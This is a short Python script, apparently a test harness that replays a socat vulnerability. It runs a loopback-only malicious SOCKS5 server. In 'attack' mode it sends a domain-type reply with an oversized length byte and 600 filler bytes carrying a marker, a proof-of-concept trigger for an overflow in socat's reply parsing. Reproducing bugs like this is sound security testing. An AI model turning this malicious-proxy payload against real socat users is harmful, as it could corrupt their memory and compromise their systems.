"""Loopback-only malicious SOCKS5 server for the socat2shell replay.

Sends the SOCKS5 method greeting, then a success reply with address_type 3 and
length byte 0xfd, followed by proxy-chosen payload bytes. Binds 127.0.0.1 only.
"""
import socket
import sys
import time

port = int(sys.argv[1])
srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("127.0.0.1", port))
srv.listen(1)
conn, addr = srv.accept()
conn.sendall(b"\x05\x00")
time.sleep(1)  # let the client finish sending its CONNECT request

mode = sys.argv[2] if len(sys.argv) > 2 else "attack"
if mode == "safe":
    head = b"\x05\x00\x00\x01"
    payload = bytes([127, 0, 0, 1, 0, 85])
else:
    head = b"\x05\x00\x00\x03\xfd"
    payload = bytearray(b"A" * 600)
    payload[257:268] = b"MISHE-SOCKS"
    payload = bytes(payload)
conn.sendall(head + payload)
time.sleep(2)  # keep the loopback peer open while socat processes the reply
